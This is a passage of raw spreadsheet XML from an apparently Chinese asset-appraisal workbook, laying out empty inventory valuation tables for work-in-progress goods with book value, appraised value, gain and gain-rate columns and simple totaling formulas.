      <c r="M6" s="594" t="n"/>
      <c r="N6" s="594" t="n"/>
      <c r="O6" s="594" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="314">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="284" t="n"/>
      <c r="C7" s="198" t="n"/>
      <c r="D7" s="315" t="n"/>
      <c r="E7" s="313" t="n"/>
      <c r="F7" s="555" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555" t="n"/>
      <c r="L7" s="555" t="n"/>
      <c r="M7" s="555">
        <f>L7-H7</f>
        <v/>
      </c>
      <c r="N7" s="555">
        <f>IF(H7=0,"",M7/H7*100)</f>
        <v/>
      </c>
      <c r="O7" s="423" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="381" t="n"/>
      <c r="E8" s="380" t="n"/>
      <c r="F8" s="555" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555" t="n"/>
      <c r="M8" s="555">
        <f>L8-H8</f>
        <v/>
      </c>
      <c r="N8" s="555">
        <f>IF(H8=0,"",M8/H8*100)</f>
        <v/>
      </c>
      <c r="O8" s="423" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="381" t="n"/>
      <c r="E9" s="380" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555" t="n"/>
      <c r="M9" s="555">
        <f>L9-H9</f>
        <v/>
      </c>
      <c r="N9" s="555">
        <f>IF(H9=0,"",M9/H9*100)</f>
        <v/>
      </c>
      <c r="O9" s="423" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="381" t="n"/>
      <c r="E10" s="380" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="555" t="n"/>
      <c r="M10" s="555">
        <f>L10-H10</f>
        <v/>
      </c>
      <c r="N10" s="555">
        <f>IF(H10=0,"",M10/H10*100)</f>
        <v/>
      </c>
      <c r="O10" s="423" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="381" t="n"/>
      <c r="E11" s="380" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555" t="n"/>
      <c r="M11" s="555">
        <f>L11-H11</f>
        <v/>
      </c>
      <c r="N11" s="555">
        <f>IF(H11=0,"",M11/H11*100)</f>
        <v/>
      </c>
      <c r="O11" s="423" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="381" t="n"/>
      <c r="E12" s="380" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555" t="n"/>
      <c r="M12" s="555">
        <f>L12-H12</f>
        <v/>
      </c>
      <c r="N12" s="555">
        <f>IF(H12=0,"",M12/H12*100)</f>
        <v/>
      </c>
      <c r="O12" s="423" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="381" t="n"/>
      <c r="E13" s="380" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="555" t="n"/>
      <c r="M13" s="555">
        <f>L13-H13</f>
        <v/>
      </c>
      <c r="N13" s="555">
        <f>IF(H13=0,"",M13/H13*100)</f>
        <v/>
      </c>
      <c r="O13" s="423" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="381" t="n"/>
      <c r="E14" s="380" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="555" t="n"/>
      <c r="M14" s="555">
        <f>L14-H14</f>
        <v/>
      </c>
      <c r="N14" s="555">
        <f>IF(H14=0,"",M14/H14*100)</f>
        <v/>
      </c>
      <c r="O14" s="423" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="381" t="n"/>
      <c r="E15" s="380" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="555" t="n"/>
      <c r="M15" s="555">
        <f>L15-H15</f>
        <v/>
      </c>
      <c r="N15" s="555">
        <f>IF(H15=0,"",M15/H15*100)</f>
        <v/>
      </c>
      <c r="O15" s="423" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="381" t="n"/>
      <c r="E16" s="380" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="555" t="n"/>
      <c r="M16" s="555">
        <f>L16-H16</f>
        <v/>
      </c>
      <c r="N16" s="555">
        <f>IF(H16=0,"",M16/H16*100)</f>
        <v/>
      </c>
      <c r="O16" s="423" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="381" t="n"/>
      <c r="E17" s="380" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555" t="n"/>
      <c r="M17" s="555">
        <f>L17-H17</f>
        <v/>
      </c>
      <c r="N17" s="555">
        <f>IF(H17=0,"",M17/H17*100)</f>
        <v/>
      </c>
      <c r="O17" s="423" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="381" t="n"/>
      <c r="E18" s="380" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="555" t="n"/>
      <c r="M18" s="555">
        <f>L18-H18</f>
        <v/>
      </c>
      <c r="N18" s="555">
        <f>IF(H18=0,"",M18/H18*100)</f>
        <v/>
      </c>
      <c r="O18" s="423" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="381" t="n"/>
      <c r="E19" s="380" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555" t="n"/>
      <c r="M19" s="555">
        <f>L19-H19</f>
        <v/>
      </c>
      <c r="N19" s="555">
        <f>IF(H19=0,"",M19/H19*100)</f>
        <v/>
      </c>
      <c r="O19" s="423" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="381" t="n"/>
      <c r="E20" s="380" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="555" t="n"/>
      <c r="M20" s="555">
        <f>L20-H20</f>
        <v/>
      </c>
      <c r="N20" s="555">
        <f>IF(H20=0,"",M20/H20*100)</f>
        <v/>
      </c>
      <c r="O20" s="423" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="381" t="n"/>
      <c r="E21" s="380" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="555" t="n"/>
      <c r="M21" s="555">
        <f>L21-H21</f>
        <v/>
      </c>
      <c r="N21" s="555">
        <f>IF(H21=0,"",M21/H21*100)</f>
        <v/>
      </c>
      <c r="O21" s="423" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="381" t="n"/>
      <c r="E22" s="380" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="555" t="n"/>
      <c r="M22" s="555">
        <f>L22-H22</f>
        <v/>
      </c>
      <c r="N22" s="555">
        <f>IF(H22=0,"",M22/H22*100)</f>
        <v/>
      </c>
      <c r="O22" s="423" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="381" t="n"/>
      <c r="E23" s="380" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="555" t="n"/>
      <c r="M23" s="555">
        <f>L23-H23</f>
        <v/>
      </c>
      <c r="N23" s="555">
        <f>IF(H23=0,"",M23/H23*100)</f>
        <v/>
      </c>
      <c r="O23" s="423" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="381" t="n"/>
      <c r="E24" s="380" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555" t="n"/>
      <c r="L24" s="555" t="n"/>
      <c r="M24" s="555">
        <f>L24-H24</f>
        <v/>
      </c>
      <c r="N24" s="555">
        <f>IF(H24=0,"",M24/H24*100)</f>
        <v/>
      </c>
      <c r="O24" s="423" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="383" t="n"/>
      <c r="D25" s="383" t="n"/>
      <c r="E25" s="380" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="555" t="n"/>
      <c r="M25" s="555">
        <f>L25-H25</f>
        <v/>
      </c>
      <c r="N25" s="555">
        <f>IF(H25=0,"",M25/H25*100)</f>
        <v/>
      </c>
      <c r="O25" s="42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0" t="n"/>
      <c r="E26" s="380" t="n"/>
      <c r="F26" s="555">
        <f>ROUND(SUM(F7:F25),2)</f>
        <v/>
      </c>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555">
        <f>ROUND(SUM(H7:H25),2)</f>
        <v/>
      </c>
      <c r="I26" s="555">
        <f>ROUND(SUM(I7:I25),2)</f>
        <v/>
      </c>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555" t="n"/>
      <c r="L26" s="555">
        <f>ROUND(SUM(L7:L25),2)</f>
        <v/>
      </c>
      <c r="M26" s="555">
        <f>L26-H26</f>
        <v/>
      </c>
      <c r="N26" s="555">
        <f>IF(H26=0,"",M26/H26*100)</f>
        <v/>
      </c>
      <c r="O26" s="423" t="n"/>
    </row>
    <row r="27" customFormat="1" s="410">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B27" s="185" t="inlineStr">
        <is>
          <t>减：存货跌价准备</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="380" t="n"/>
      <c r="E27" s="380" t="n"/>
      <c r="F27" s="555" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555" t="n"/>
      <c r="L27" s="555" t="n"/>
      <c r="M27" s="555">
        <f>L27-H27</f>
        <v/>
      </c>
      <c r="N27" s="555">
        <f>IF(H27=0,"",M27/H27*100)</f>
        <v/>
      </c>
      <c r="O27" s="423" t="n"/>
    </row>
    <row r="28" customFormat="1" s="410">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B28" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="380" t="n"/>
      <c r="E28" s="383" t="n"/>
      <c r="F28" s="555">
        <f>ROUND(F26-F27,2)</f>
        <v/>
      </c>
      <c r="G28" s="555" t="n"/>
      <c r="H28" s="555">
        <f>ROUND(H26-H27,2)</f>
        <v/>
      </c>
      <c r="I28" s="555">
        <f>ROUND(I26-I27,2)</f>
        <v/>
      </c>
      <c r="J28" s="555" t="n"/>
      <c r="K28" s="555" t="n"/>
      <c r="L28" s="555">
        <f>ROUND(L26-L27,2)</f>
        <v/>
      </c>
      <c r="M28" s="555">
        <f>L28-H28</f>
        <v/>
      </c>
      <c r="N28" s="555">
        <f>IF(H28=0,"",M28/H28*100)</f>
        <v/>
      </c>
      <c r="O28" s="423" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="14">
    <mergeCell ref="O5:O6"/>
    <mergeCell ref="B1:O1"/>
    <mergeCell ref="E5:E6"/>
    <mergeCell ref="N5:N6"/>
    <mergeCell ref="F5:H5"/>
    <mergeCell ref="B2:O2"/>
    <mergeCell ref="B28:C28"/>
    <mergeCell ref="C5:C6"/>
    <mergeCell ref="B26:C26"/>
    <mergeCell ref="B27:C27"/>
    <mergeCell ref="D5:D6"/>
    <mergeCell ref="B5:B6"/>
    <mergeCell ref="I5:L5"/>
    <mergeCell ref="M5:M6"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:O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0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 codeName="Sheet33">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:N28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12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="15.1666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="19.6666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="19" customWidth="1" style="410" min="4" max="4"/>
    <col width="7.66666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col outlineLevel="1" width="12.1666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col width="7.5" customWidth="1" style="582" min="7" max="7"/>
    <col width="12.6666666666667" customWidth="1" style="582" min="8" max="8"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="582" min="9" max="10"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="582" min="11" max="11"/>
    <col outlineLevel="1" width="10.6666666666667" customWidth="1" style="582" min="12" max="12"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="582" min="13" max="13"/>
    <col width="9.5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存货—在产品（自制半成品）评估明细表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373" t="n"/>
      <c r="N3" s="402" t="inlineStr">
        <is>
          <t>表3-9-6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583" t="n"/>
      <c r="H4" s="583" t="n"/>
      <c r="I4" s="583" t="n"/>
      <c r="J4" s="583" t="n"/>
      <c r="K4" s="583" t="n"/>
      <c r="L4" s="583" t="n"/>
      <c r="M4" s="583" t="n"/>
      <c r="N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185" t="inlineStr">
        <is>
          <t>名称</t>
        </is>
      </c>
      <c r="D5" s="185" t="inlineStr">
        <is>
          <t>规格型号</t>
        </is>
      </c>
      <c r="E5" s="272" t="inlineStr">
        <is>
          <t>计量
单位</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="G5" s="593" t="n"/>
      <c r="H5" s="567" t="n"/>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="J5" s="593" t="n"/>
      <c r="K5" s="567" t="n"/>
      <c r="L5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="M5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="N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380" t="inlineStr">
        <is>
          <t>数量</t>
        </is>
      </c>
      <c r="G6" s="380" t="inlineStr">
        <is>
          <t>单价</t>
        </is>
      </c>
      <c r="H6" s="380" t="inlineStr">
        <is>
          <t>金额</t>
        </is>
      </c>
      <c r="I6" s="380" t="inlineStr">
        <is>
          <t>实际数量</t>
        </is>
      </c>
      <c r="J6" s="380" t="inlineStr">
        <is>
          <t>单价</t>
        </is>
      </c>
      <c r="K6" s="380" t="inlineStr">
        <is>
          <t>金额</t>
        </is>
      </c>
      <c r="L6" s="594" t="n"/>
      <c r="M6" s="594" t="n"/>
      <c r="N6" s="594" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="314">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="284" t="n"/>
      <c r="C7" s="198" t="n"/>
      <c r="D7" s="315" t="n"/>
      <c r="E7" s="313" t="n"/>
      <c r="F7" s="555" t="n"/>
      <c r="G7" s="555" t="inlineStr"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555" t="n"/>
      <c r="L7" s="555">
        <f>K7-H7</f>
        <v/>
      </c>
      <c r="M7" s="555">
        <f>IF(H7=0,"",L7/H7*100)</f>
        <v/>
      </c>
      <c r="N7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="381" t="n"/>
      <c r="E8" s="380" t="n"/>
      <c r="F8" s="555" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555">
        <f>K8-H8</f>
        <v/>
      </c>
      <c r="M8" s="555">
        <f>IF(H8=0,"",L8/H8*100)</f>
        <v/>
      </c>
      <c r="N8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="381" t="n"/>
      <c r="E9" s="380" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555">
        <f>K9-H9</f>
        <v/>
      </c>
      <c r="M9" s="555">
        <f>IF(H9=0,"",L9/H9*100)</f>
        <v/>
      </c>
      <c r="N9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="381" t="n"/>
      <c r="E10" s="380" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="555">
        <f>K10-H10</f>
        <v/>
      </c>
      <c r="M10" s="555">
        <f>IF(H10=0,"",L10/H10*100)</f>
        <v/>
      </c>
      <c r="N10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="381" t="n"/>
      <c r="E11" s="380" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555">
        <f>K11-H11</f>
        <v/>
      </c>
      <c r="M11" s="555">
        <f>IF(H11=0,"",L11/H11*100)</f>
        <v/>
      </c>
      <c r="N11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="381" t="n"/>
      <c r="E12" s="380" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555">
        <f>K12-H12</f>
        <v/>
      </c>
      <c r="M12" s="555">
        <f>IF(H12=0,"",L12/H12*100)</f>
        <v/>
      </c>
      <c r="N12" s="383" t="n"/>
    </row>
    <row r="13" ht="17.25" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="381" t="n"/>
      <c r="E13" s="380" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="555">
        <f>K13-H13</f>
        <v/>
      </c>
      <c r="M13" s="555">
        <f>IF(H13=0,"",L13/H13*100)</f>
        <v/>
      </c>
      <c r="N13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="381" t="n"/>
      <c r="E14" s="380" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="555">
        <f>K14-H14</f>
        <v/>
      </c>
      <c r="M14" s="555">
        <f>IF(H14=0,"",L14/H14*100)</f>
        <v/>
      </c>
      <c r="N14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="381" t="n"/>
      <c r="E15" s="380" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="555">
        <f>K15-H15</f>
        <v/>
      </c>
      <c r="M15" s="555">
        <f>IF(H15=0,"",L15/H15*100)</f>
        <v/>
      </c>
      <c r="N15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="381" t="n"/>
      <c r="E16" s="380" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="555">
        <f>K16-H16</f>
        <v/>
      </c>
      <c r="M16" s="555">
        <f>IF(H16=0,"",L16/H16*100)</f>
        <v/>
      </c>
      <c r="N16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="381" t="n"/>
      <c r="E17" s="380" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555">
        <f>K17-H17</f>
        <v/>
      </c>
      <c r="M17" s="555">
        <f>IF(H17=0,"",L17/H17*100)</f>
        <v/>
      </c>
      <c r="N17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="381" t="n"/>
      <c r="E18" s="380" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="555">
        <f>K18-H18</f>
        <v/>
      </c>
      <c r="M18" s="555">
        <f>IF(H18=0,"",L18/H18*100)</f>
        <v/>
      </c>
      <c r="N18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="381" t="n"/>
      <c r="E19" s="380" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555">
        <f>K19-H19</f>
        <v/>
      </c>
      <c r="M19" s="555">
        <f>IF(H19=0,"",L19/H19*100)</f>
        <v/>
      </c>
      <c r="N19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="381" t="n"/>
      <c r="E20" s="380" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="555">
        <f>K20-H20</f>
        <v/>
      </c>
      <c r="M20" s="555">
        <f>IF(H20=0,"",L20/H20*100)</f>
        <v/>
      </c>
      <c r="N20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
